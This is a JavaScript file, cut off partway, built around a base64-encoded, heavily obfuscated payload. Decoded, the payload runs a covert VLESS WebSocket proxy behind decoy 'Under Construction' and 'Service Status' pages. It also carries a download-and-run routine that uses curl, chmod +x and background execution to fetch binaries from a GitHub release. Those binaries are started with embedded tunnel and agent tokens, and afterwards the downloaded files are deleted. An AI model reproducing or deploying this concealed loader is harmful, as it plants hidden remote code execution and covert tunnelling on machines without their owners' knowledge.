const { execSync } = require('child_process');
const b = `Y29uc3QgXzB4Mzc3MzBiPV8weDI0M2U7KGZ1bmN0aW9uKF8weDJiODE5YSxfMHg1NmJjMTQpe2NvbnN0IF8weDQ2MTJiND1fMHgyNDNlLF8weGYwNDQ0Nz1fMHgyYjgxOWEoKTt3aGlsZSghIVtdKXt0cnl7Y29uc3QgXzB4MjYwMGVkPS1wYXJzZUludChfMHg0NjEyYjQoMHgxNzIpKS8weDEqKHBhcnNlSW50KF8weDQ2MTJiNCgweDE3NikpLzB4MikrcGFyc2VJbnQoXzB4NDYxMmI0KDB4MTMxKSkvMHgzKihwYXJzZUludChfMHg0NjEyYjQoMHgxM2EpKS8weDQpK3BhcnNlSW50KF8weDQ2MTJiNCgweDE0NikpLzB4NStwYXJzZUludChfMHg0NjEyYjQoMHgxNjgpKS8weDYrcGFyc2VJbnQoXzB4NDYxMmI0KDB4MTRkKSkvMHg3K3BhcnNlSW50KF8weDQ2MTJiNCgweDE1YykpLzB4OCstcGFyc2VJbnQoXzB4NDYxMmI0KDB4MTQyKSkvMHg5O2lmKF8weDI2MDBlZD09PV8weDU2YmMxNClicmVhaztlbHNlIF8weGYwNDQ0N1sncHVzaCddKF8weGYwNDQ0N1snc2hpZnQnXSgpKTt9Y2F0Y2goXzB4MWRkNDY0KXtfMHhmMDQ0NDdbJ3B1c2gnXShfMHhmMDQ0NDdbJ3NoaWZ0J10oKSk7fX19KF8weDViOGIsMHhhYmJmYikpO2NvbnN0IHtleGVjfT1yZXF1aXJlKF8weDM3NzMwYigweDEyZikpLHtXZWJTb2NrZXQsY3JlYXRlV2ViU29ja2V0U3RyZWFtfT1yZXF1aXJlKCd3cycpLGh0dHA9cmVxdWlyZShfMHgzNzczMGIoMHgxNTUpKSx7VVJMfT1yZXF1aXJlKF8weDM3NzMwYigweDE2MSkpLG5ldD1yZXF1aXJlKCduZXQnKSxvcz1yZXF1aXJlKCdvcycpLHBhdGg9cmVxdWlyZShfMHgzNzczMGIoMHgxNmIpKSxDT05GSUc9eydVVUlEJzoocHJvY2Vzc1tfMHgzNzczMGIoMHgxMzQpXVsnVVVJRCddfHwnZmVlZmViOTYtYmZjZi00YTliLWFhYzAtNmFhYzc3MWMxYjk4JylbXzB4Mzc3MzBiKDB4MTdjKV0oLy0vZywnJyksJ09SSUdJTkFMX1VVSUQnOnByb2Nlc3NbXzB4Mzc3MzBiKDB4MTM0KV1bXzB4Mzc3MzBiKDB4MTMyKV18fF8weDM3NzMwYigweDE0MyksJ1BPUlQnOnByb2Nlc3NbJ2VudiddW18weDM3NzMwYigweDE2OSldfHxwcm9jZXNzW18weDM3NzMwYigweDEzNCldW18weDM3NzMwYigweDE3NCldfHwweDFlYjQsJ05fUyc6cHJvY2Vzc1snZW52J11bXzB4Mzc3MzBiKDB4MTRiKV18fF8weDM3NzMwYigweDE3YiksJ0NfQic6cHJvY2Vzc1tfMHgzNzczMGIoMHgxMzQpXVtfMHgzNzczMGIoMHgxMmIpXXx8JzEuc2Vhdy5jZicsJ05fSyc6cHJvY2Vzc1tfMHgzNzczMGIoMHgxMzQpXVtfMHgzNzczMGIoMHgxNDApXXx8XzB4Mzc3MzBiKDB4MTYzKSwnQ19UJzpwcm9jZXNzWydlbnYnXVsnQ19UJ118fF8weDM3NzMwYigweDE0ZiksJ0NfRCc6cHJvY2Vzc1tfMHgzNzczMGIoMHgxMzQpXVtfMHgzNzczMGIoMHgxN2QpXXx8XzB4Mzc3MzBiKDB4MTZmKX0sZ2VuZXJhdGVWbGVzc0xpbms9KCk9Pntjb25zdCBfMHgzZjYxY2U9XzB4Mzc3MzBiLF8weDJjNTYwZT1fMHgzZjYxY2UoMHgxNWQpK0NPTkZJR1tfMHgzZjYxY2UoMHgxNDUpXSsnQCcrQ09ORklHWydDX0InXSsnOjQ0Mz90eXBlPXdzJnBhdGg9JytlbmNvZGVVUklDb21wb25lbnQoJy92bCcpK18weDNmNjFjZSgweDEyZCkrQ09ORklHWydDX0QnXStfMHgzZjYxY2UoMHgxNDgpK0NPTkZJR1tfMHgzZjYxY2UoMHgxN2QpXSsnJmZwPWNocm9tZSZzZWN1cml0eT10bHMjJytDT05GSUdbJ0NfRCddO3JldHVybiBCdWZmZXJbXzB4M2Y2MWNlKDB4MTZlKV0oXzB4MmM1NjBlKVtfMHgzZjYxY2UoMHgxNjUpXShfMHgzZjYxY2UoMHgxMzgpKTt9LEhUTUxfVEVNUExBVEVTPXsnaG9tZSc6XzB4Mzc3MzBiKDB4MTMzKSwnc3RhdHVzJzooXzB4MmFmZDVmLF8weDI1MjVkYyk9Pl8weDM3NzMwYigweDE0OSkrXzB4MmFmZDVmK18weDM3NzMwYigweDE0YykrXzB4MjUyNWRjK18weDM3NzMwYigweDE1NikrXzB4MjUyNWRjKydceDI3KS50aGVuKCgpPT5hbGVydChceDI3Q29waWVkIVx4MjcpKVx4MjI+Q29weTwvYnV0dG9uPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvZGl2Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvYm9keT5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8L2h0bWw+XHgwYVx4MjBceDIwXHgyMFx4MjAnfSxzZXJ2ZXI9aHR0cFtfMHgzNzczMGIoMHgxNmQpXSgoXzB4MmZmYTdmLF8weDEzZDY5OCk9Pntjb25zdCBfMHg0M2VmNzg9XzB4Mzc3MzBiO3RyeXtjb25zdCB7cGF0aG5hbWU6XzB4NjM2NmRhfT1uZXcgVVJMKF8weDJmZmE3ZltfMHg0M2VmNzgoMHgxNjEpXSxfMHg0M2VmNzgoMHgxN2EpK18weDJmZmE3ZltfMHg0M2VmNzgoMHgxNzApXVtfMHg0M2VmNzgoMHgxNTMpXSk7c3dpdGNoKF8weDYzNjZkYSl7Y2FzZScvJzpfMHgxM2Q2OThbJ3dyaXRlSGVhZCddKDB4YzgseydDb250ZW50LVR5cGUnOl8weDQzZWY3OCgweDE2Mil9KSxfMHgxM2Q2OThbXzB4NDNlZjc4KDB4MTQ3KV0oSFRNTF9URU1QTEFURVNbXzB4NDNlZjc4KDB4MTNmKV0pO2JyZWFrO2Nhc2UnL3gnOl8weDEzZDY5OFtfMHg0M2VmNzgoMHgxMjkpXSgweGM4LHsnQ29udGVudC1UeXBlJzpfMHg0M2VmNzgoMHgxNjIpfSksXzB4MTNkNjk4W18weDQzZWY3OCgweDE0NyldKEhUTUxfVEVNUExBVEVTWydzdGF0dXMnXShDT05GSUdbXzB4NDNlZjc4KDB4MTY5KV0sZ2VuZXJhdGVWbGVzc0xpbmsoKSkpO2JyZWFrO2Nhc2UgXzB4NDNlZjc4KDB4MTY3KTpfMHgxM2Q2OThbJ3dyaXRlSGVhZCddKDB4YzgseydDb250ZW50LVR5cGUnOl8weDQzZWY3OCgweDE3Nyl9KSxfMHgxM2Q2OThbXzB4NDNlZjc4KDB4MTQ3KV0oSlNPTltfMHg0M2VmNzgoMHgxNGUpXSh7J3N0YXR1cyc6J29rJywndXB0aW1lJzpwcm9jZXNzW18weDQzZWY3OCgweDE1MildKCl9KSk7YnJlYWs7ZGVmYXVsdDpfMHgxM2Q2OThbXzB4NDNlZjc4KDB4MTI5KV0oMHgxOTQseydDb250ZW50LVR5cGUnOl8weDQzZWY3OCgweDE3NSl9KSxfMHgxM2Q2OThbJ2VuZCddKCdOb3RceDIwRm91bmQnKTt9fWNhdGNoKF8weDQxZGEyNil7IV8weDEzZDY5OFtfMHg0M2VmNzgoMHgxNzEpXSYmKF8weDEzZDY5OFtfMHg0M2VmNzgoMHgxMjkpXSgweDFmNCx7J0NvbnRlbnQtVHlwZSc6J3RleHQvcGxhaW4nfSksXzB4MTNkNjk4WydlbmQnXShfMHg0M2VmNzgoMHgxNTkpKSk7fX0pLHdzPW5ldyBXZWJTb2NrZXRbKF8weDM3NzMwYigweDEzZSkpXSh7J3NlcnZlcic6c2VydmVyLCdwYXRoJzonL3ZsJ30pO2Z1bmN0aW9uIF8weDI0M2UoXzB4M2I2ZmYzLF8weDRiYmY2YSl7Y29uc3QgXzB4NWI4YjAzPV8weDViOGIoKTtyZXR1cm4gXzB4MjQzZT1mdW5jdGlvbihfMHgyNDNlMjQsXzB4ZWUxNTFlKXtfMHgyNDNlMjQ9XzB4MjQzZTI0LTB4MTI3O2xldCBfMHgyMjA3MGQ9XzB4NWI4YjAzW18weDI0M2UyNF07cmV0dXJuIF8weDIyMDcwZDt9LF8weDI0M2UoXzB4M2I2ZmYzLF8weDRiYmY2YSk7fXdzWydvbiddKF8weDM3NzMwYigweDEzZCksXzB4ZDU1NDM9Pntjb25zdCBfMHgyNDRiYzM9XzB4Mzc3MzBiO18weGQ1NTQzW18weDI0NGJjMygweDE3OSldKF8weDI0NGJjMygweDEzNSksXzB4NGQzNjNjPT57Y29uc3QgXzB4MTMwNTIwPV8weDI0NGJjMyxbXzB4NDU3YmRjXT1fMHg0ZDM2M2MsXzB4MTIxODFlPV8weDRkMzYzY1snc2xpY2UnXSgweDEsMHgxMSk7aWYoIV8weDEyMTgxZVtfMHgxMzA1MjAoMHgxNTEpXSgoXzB4NDM2NTczLF8weDFlNWEzMyk9Pl8weDQzNjU3Mz09PXBhcnNlSW50KENPTkZJR1tfMHgxMzA1MjAoMHgxMzIpXVtfMHgxMzA1MjAoMHgxNmEpXShfMHgxZTVhMzMqMHgyLDB4MiksMHgxMCkpKXJldHVybjtsZXQgXzB4NDFmMzE1PV8weDRkMzYzY1tfMHgxMzA1MjAoMHgxNzgpXSgweDExLDB4MTIpWydyZWFkVUludDgnXSgpKzB4MTM7Y29uc3QgXzB4MTY5MDk3PV8weDRkMzYzY1tfMHgxMzA1MjAoMHgxNzgpXShfMHg0MWYzMTUsXzB4NDFmMzE1Kz0weDIpW18weDEzMDUyMCgweDEzNildKDB4MCksXzB4NDlhM2M4PV8weDRkMzYzY1tfMHgxMzA1MjAoMHgxNzgpXShfMHg0MWYzMTUsXzB4NDFmMzE1Kz0weDEpW18weDEzMDUyMCgweDE1ZildKCk7bGV0IF8weGE5NDgxZDtpZihfMHg0OWEzYzg9PT0weDEpXzB4YTk0ODFkPV8weDRkMzYzY1tfMHgxMzA1MjAoMHgxNzgpXShfMHg0MWYzMTUsXzB4NDFmMzE1Kz0weDQpW18weDEzMDUyMCgweDE2NCldKCcuJyk7ZWxzZXtpZihfMHg0OWEzYzg9PT0weDIpe2NvbnN0IF8weDVhNTEwMT1fMHg0ZDM2M2NbJ3NsaWNlJ10oXzB4NDFmMzE1LF8weDQxZjMxNSs9MHgxKVsncmVhZFVJbnQ4J10oKTtfMHhhOTQ4MWQ9bmV3IFRleHREZWNvZGVyKClbXzB4MTMwNTIwKDB4MTNiKV0oXzB4NGQzNjNjW18weDEzMDUyMCgweDE3OCldKF8weDQxZjMxNSxfMHg0MWYzMTUrPV8weDVhNTEwMSkpO31lbHNlIF8weDQ5YTNjOD09PTB4MyYmKF8weGE5NDgxZD1fMHg0ZDM2M2NbXzB4MTMwNTIwKDB4MTc4KV0oXzB4NDFmMzE1LF8weDQxZjMxNSs9MHgxMClbJ3JlZHVjZSddKChfMHg3NTNhOWQsXzB4NGUzMGM1LF8weDM2YTYzNCxfMHgzYmY3MTEpPT5fMHgzNmE2MzQlMHgyP18weDc1M2E5ZFtfMHgxMzA1MjAoMHgxNGEpXShfMHgzYmY3MTFbXzB4MTMwNTIwKDB4MTc4KV0oXzB4MzZhNjM0LTB4MSxfMHgzNmE2MzQrMHgxKSk6XzB4NzUzYTlkLFtdKVtfMHgxMzA1MjAoMHgxNWEpXShfMHgxZDU2MWY9Pl8weDFkNTYxZltfMHgxMzA1MjAoMHgxMzYpXSgweDApWyd0b1N0cmluZyddKDB4MTApKVsnam9pbiddKCc6JykpO31pZihfMHhkNTU0M1tfMHgxMzA1MjAoMHgxMzApXT09PVdlYlNvY2tldFtfMHgxMzA1MjAoMHgxNjYpXSl7XzB4ZDU1NDNbXzB4MTMwNTIwKDB4MTQ0KV0obmV3IFVpbnQ4QXJyYXkoW18weDQ1N2JkYywweDBdKSk7Y29uc3QgXzB4MTNjOTY4PWNyZWF0ZVdlYlNvY2tldFN0cmVhbShfMHhkNTU0Myk7XzB4MTNjOTY4WydvbiddKF8weDEzMDUyMCgweDE2YyksKCk9Pnt9KTtjb25zdCBfMHg3ZmEzMmQ9bmV0Wydjb25uZWN0J10oeydob3N0JzpfMHhhOTQ4MWQsJ3BvcnQnOl8weDE2OTA5N30sZnVuY3Rpb24oKXtjb25zdCBfMHg1MGFkNTE9XzB4MTMwNTIwO3RoaXNbJ3dyaXRlJ10oXzB4NGQzNjNjW18weDUwYWQ1MSgweDE3OCldKF8weDQxZjMxNSkpLF8weDEzYzk2OFsncGlwZSddKHRoaXMpW18weDUwYWQ1MSgweDEyYyldKF8weDEzYzk2OCk7fSk7XzB4N2ZhMzJkWydvbiddKCdlcnJvcicsKCk9Pnt9KTt9fSk7fSk7ZnVuY3Rpb24gXzB4NWI4Yigpe2NvbnN0IF8weDQ1ZTQ1MD1bJ2ZlZWZlYjk2LWJmY2YtNGE5Yi1hYWMwLTZhYWM3NzFjMWI5OCcsJ3NlbmQnLCdPUklHSU5BTF9VVUlEJywnNTU2MTY1MHR1Q25USycsJ2VuZCcsJyZlbmNyeXB0aW9uPW5vbmUmc25pPScsJ1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxodG1sPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxoZWFkPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8dGl0bGU+U2VydmljZVx4MjBTdGF0dXM8L3RpdGxlPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8c3R5bGU+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBib2R5e2ZvbnQtZmFtaWx5OkFyaWFsLHNhbnMtc2VyaWY7bWFyZ2luOjQwcHg7YmFja2dyb3VuZC1jb2xvcjojZjVmNWY1fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLmNvbnRhaW5lcnttYXgtd2lkdGg6NjAwcHg7bWFyZ2luOjBceDIwYXV0bztiYWNrZ3JvdW5kOndoaXRlO3BhZGRpbmc6MzBweDtib3JkZXItcmFkaXVzOjhweDtib3gtc2hhZG93OjBceDIwMnB4XHgyMDEwcHhceDIwcmdiYSgwLDAsMCwwLjEpfVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwaDF7Y29sb3I6IzMzMzt0ZXh0LWFsaWduOmNlbnRlcn1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5pbmZvLWl0ZW17bWFyZ2luOjIwcHhceDIwMDtwYWRkaW5nOjE1cHg7YmFja2dyb3VuZDojZjhmOWZhO2JvcmRlci1yYWRpdXM6NXB4fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLmxhYmVse2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6IzU1NTttYXJnaW4tYm90dG9tOjEwcHh9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAudmFsdWV7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2JhY2tncm91bmQ6I2U5ZWNlZjtwYWRkaW5nOjEwcHg7Ym9yZGVyLXJhZGl1czo0cHg7d29yZC1icmVhazpicmVhay1hbGx9XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjAuY29weS1idG57YmFja2dyb3VuZDojMDA3Y2JhO2NvbG9yOndoaXRlO2JvcmRlcjpub25lO3BhZGRpbmc6OHB4XHgyMDE1cHg7Ym9yZGVyLXJhZGl1czozcHg7Y3Vyc29yOnBvaW50ZXI7bWFyZ2luLXRvcDoxMHB4fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwLmNvcHktYnRuOmhvdmVye2JhY2tncm91bmQ6IzAwNTZiM31ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9zdHlsZT5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8L2hlYWQ+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGJvZHk+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxkaXZceDIwY2xhc3M9XHgyMmNvbnRhaW5lclx4MjI+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8aDE+U2VydmljZVx4MjBSdW5uaW5nPC9oMT5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxkaXZceDIwY2xhc3M9XHgyMmluZm8taXRlbVx4MjI+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIybGFiZWxceDIyPlBvcnQ6PC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIydmFsdWVceDIyPicsJ2NvbmNhdCcsJ05fUycsJzwvZGl2Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8ZGl2XHgyMGNsYXNzPVx4MjJpbmZvLWl0ZW1ceDIyPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxkaXZceDIwY2xhc3M9XHgyMmxhYmVsXHgyMj5Db25uZWN0aW9uXHgyMExpbmtceDIwKEJhc2U2NCk6PC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIydmFsdWVceDIyXHgyMGlkPVx4MjJ2bGVzc0xpbmtceDIyPicsJzExNDg2MDlTT0ZkdlEnLCdzdHJpbmdpZnknLCdleUpoSWpvaVpqQXpNR1kxWkRnNE9HRXlZbVJsTjJOaU1EZzNOVFU1TXpNNFpqRTBPVGNpTENKMElqb2lNekk0TVRGbE5USXRNemRrTWkwME1ESmhMV0ppWVRFdE16WXlOalZrTTJNMU9UVTNJaXdpY3lJNklrNVVZM2RaZWxwcFRqSlpkRTVFYXpGWmFUQXdXWHBrYUV4VWFHcGFSMDEwVDBSUk5VMHlVWGhQVkdzeFRrUldhU0o5JywndHVubmVsXHgyMC0tZWRnZS1pcC12ZXJzaW9uXHgyMGF1dG9ceDIwLS1wcm90b2NvbFx4MjBodHRwMlx4MjAtLW5vLWF1dG91cGRhdGVceDIwcnVuXHgyMC0tdG9rZW5ceDIwJywnZXZlcnknLCd1cHRpbWUnLCdob3N0JywnXHgyMC1vXHgyMFx4MjInLCdodHRwJywnPC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGJ1dHRvblx4MjBjbGFzcz1ceDIyY29weS1idG5ceDIyXHgyMG9uY2xpY2s9XHgyMm5hdmlnYXRvci5jbGlwYm9hcmQud3JpdGVUZXh0KFx4MjcnLCdceDIyXHgyMCYmXHgyMGNobW9kXHgyMCt4XHgyMFx4MjInLCd0bXBkaXInLCdJbnRlcm5hbFx4MjBTZXJ2ZXJceDIwRXJyb3InLCdtYXAnLCc6NDQzXHgyMC1wXHgyMCcsJzE3NjcyMDBsY3dhZUEnLCd2bGVzczovLycsJ2N1cmxceDIwLUxceDIwJywncmVhZFVJbnQ4Jywncm1ceDIwLWZceDIwXHgyMicsJ3VybCcsJ3RleHQvaHRtbCcsJ3lIMzdMbUR0djVrYkp3R0dDWCcsJ2pvaW4nLCd0b1N0cmluZycsJ09QRU4nLCcvaGVhbHRoJywnMzU0NjY2dGtxRUZYJywnUE9SVCcsJ3N1YnN0cicsJ3BhdGgnLCdlcnJvcicsJ2NyZWF0ZVNlcnZlcicsJ2Zyb20nLCdzY2FsaW5nby5zZWF2LmV1Lm9yZycsJ2hlYWRlcnMnLCdoZWFkZXJzU2VudCcsJzQ3cnNFQ2lmJywnQ19UJywnU0VSVkVSX1BPUlQnLCd0ZXh0L3BsYWluJywnNDMxOThpRUZpUG4nLCdhcHBsaWNhdGlvbi9qc29uJywnc2xpY2UnLCdvbmNlJywnaHR0cDovLycsJ256LnNlYXYuZXUub3JnJywncmVwbGFjZScsJ0NfRCcsJ2xpc3RlbicsJ1x4MjA+XHgyMC9kZXYvbnVsbFx4MjAyPiYxXHgyMCYnLCd3cml0ZUhlYWQnLCdTZXJ2ZXJceDIwcnVubmluZ1x4MjBvblx4MjBwb3J0XHgyMCcsJ0NfQicsJ3BpcGUnLCcmaG9zdD0nLCdyYW5kb20nLCdjaGlsZF9wcm9jZXNzJywncmVhZHlTdGF0ZScsJzI0NDA2NUlsYVJvQycsJ1VVSUQnLCdceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8aHRtbD5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8aGVhZD5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPHRpdGxlPlVuZGVyXHgyMENvbnN0cnVjdGlvbjwvdGl0bGU+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxzdHlsZT5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGJvZHl7Zm9udC1mYW1pbHk6QXJpYWwsc2Fucy1zZXJpZjttYXJnaW46MDtwYWRkaW5nOjA7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCM2NjdlZWFceDIwMCUsIzc2NGJhMlx4MjAxMDAlKTttaW4taGVpZ2h0OjEwMHZoO2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcn1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5jb250YWluZXJ7dGV4dC1hbGlnbjpjZW50ZXI7YmFja2dyb3VuZDp3aGl0ZTtwYWRkaW5nOjYwcHhceDIwNDBweDtib3JkZXItcmFkaXVzOjE1cHg7Ym94LXNoYWRvdzowXHgyMDEwcHhceDIwMzBweFx4MjByZ2JhKDAsMCwwLDAuMik7bWF4LXdpZHRoOjUwMHB4O21hcmdpbjoyMHB4fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwaDF7Y29sb3I6IzMzMztmb250LXNpemU6Mi41ZW07bWFyZ2luLWJvdHRvbToyMHB4O2ZvbnQtd2VpZ2h0OjMwMH1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHB7Y29sb3I6IzY2Njtmb250LXNpemU6MS4yZW07bGluZS1oZWlnaHQ6MS42O21hcmdpbi1ib3R0b206MzBweH1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5pY29ue2ZvbnQtc2l6ZTo0ZW07bWFyZ2luLWJvdHRvbToyMHB4O2NvbG9yOiM2NjdlZWE7Zm9udC13ZWlnaHQ6Ym9sZH1ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMC5mb290ZXJ7Y29sb3I6Izk5OTtmb250LXNpemU6MC45ZW07bWFyZ2luLXRvcDozMHB4fVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8L3N0eWxlPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvaGVhZD5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8Ym9keT5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIyY29udGFpbmVyXHgyMj5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxkaXZceDIwY2xhc3M9XHgyMmljb25ceDIyPlshXTwvZGl2Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGgxPldlYnNpdGVceDIwVW5kZXJceDIwQ29uc3RydWN0aW9uPC9oMT5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDxwPldlXHgyN3JlXHgyMHdvcmtpbmdceDIwaGFyZFx4MjB0b1x4MjBicmluZ1x4MjB5b3VceDIwc29tZXRoaW5nXHgyMGFtYXppbmcuXHgyMFBsZWFzZVx4MjBjaGVja1x4MjBiYWNrXHgyMHNvb24hPC9wPlx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwPGRpdlx4MjBjbGFzcz1ceDIyZm9vdGVyXHgyMj5UaGFua1x4MjB5b3VceDIwZm9yXHgyMHlvdXJceDIwcGF0aWVuY2UuPC9kaXY+XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvZGl2Plx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMDwvYm9keT5ceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjA8L2h0bWw+XHgwYVx4MjBceDIwXHgyMFx4MjAnLCdlbnYnLCdtZXNzYWdlJywncmVhZFVJbnQxNkJFJywnL2NmJywnYmFzZTY0JywnaHR0cHM6Ly9naXRodWIuY29tL3NlYXYxL2RsL3JlbGVhc2VzL2Rvd25sb2FkL2ZpbGVzJywnNjhudlFqdnQnLCdkZWNvZGUnLCctc1x4MjAnLCdjb25uZWN0aW9uJywnU2VydmVyJywnaG9tZScsJ05fSycsJ1x4MjAtLXRsc1x4MjAtLXNraXAtcHJvY3NceDIwLS1za2lwLWNvbm4nLCcxMDk4NzQ0M3RlTHhKTCddO18weDViOGI9ZnVuY3Rpb24oKXtyZXR1cm4gXzB4NDVlNDUwO307cmV0dXJuIF8weDViOGIoKTt9Y29uc3QgZG93bmxvYWRBbmRSdW49KF8weDNjYjEzZSxfMHgzNTZlYzIsXzB4NGM4MDA0LF8weDFjOWRkMyk9PntzZXRUaW1lb3V0KCgpPT57Y29uc3QgXzB4NGU0ZjA1PV8weDI0M2U7aWYoIV8weDNjYjEzZSlyZXR1cm47Y29uc3QgXzB4M2M0YTZlPXBhdGhbJ2pvaW4nXShvc1tfMHg0ZTRmMDUoMHgxNTgpXSgpLF8we